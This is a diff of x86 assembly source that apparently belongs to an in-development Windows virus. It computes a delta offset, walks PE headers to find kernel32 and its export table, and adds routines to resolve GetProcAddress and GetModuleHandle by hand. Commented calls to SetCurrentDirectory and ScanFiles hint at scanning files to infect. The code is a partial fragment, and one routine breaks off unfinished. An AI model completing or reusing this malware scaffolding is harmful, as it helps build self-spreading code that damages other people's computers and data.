@@ -43,12 +43,12 @@ delta:
 	mov [ebp+delta_var],ebp
 	;call 
 scan_import:
-	mov esi,[image_base+ebp]			;
+	mov esi,[image_base+ebp]			; point on image base
 	add eax,3ch						;
 	mov eax,[eax]					;
-	add eax,esi
-	add eax,128
-	mov eax,[eax]
+	add eax,esi						;
+	add eax,128						;
+	mov eax,[eax]					;
 	add eax,esi
 	add eax,12
 find_kernel32:
@@ -58,7 +58,6 @@ find_kernel32:
 	call is_it_kernel32
 	cmp ecx,3
 	jae find_kernel32
-	
 find_kernel_image_base:
 	mov eax,[eax+4]
 	add eax,esi
@@ -91,7 +90,15 @@ find_MZ_in_kernel:
 	mov esi,[esi]
 	add esi,edi				; !!! esi point now to the EXPORT TABLE !!!
 	
-
+find_API:
+	push ebp
+	call find_ProcAddress
+	mov ebx,[esp]
+	mov dword ptr [ebx+GetProcAddressAdd],ebp
+	pop ebp
+	
+	push ebp
+	call find_getModuleHandle
 
 is_it_kernel32: 
 	xor ecx,ecx
@@ -110,7 +117,27 @@ az2:
 	inc ecx
 az3:	
 	ret
-
+find_ProcAddress:
+	xor eax,eax
+	xor ecx,ecx
+	xor edx,edx
+	xor ebp,ebp
+	
+	inc edx
+	mov eax,esi
+	mov ebp,esi
+	
+	add ebp,28			; ebp now points to RVA of List of Function Addresses    	
+	add eax,32
+	
+	mov ebp,[ebp]
+	add ebp,edi
+	mov eax,[eax]
+	add eax,edi
+	
+	mov ebx,eax
+	mov eax,[ebx]
+	add eax,edi
 	;invoke SetCurrentDirectory, addr path
 	;call ScanFiles
 	
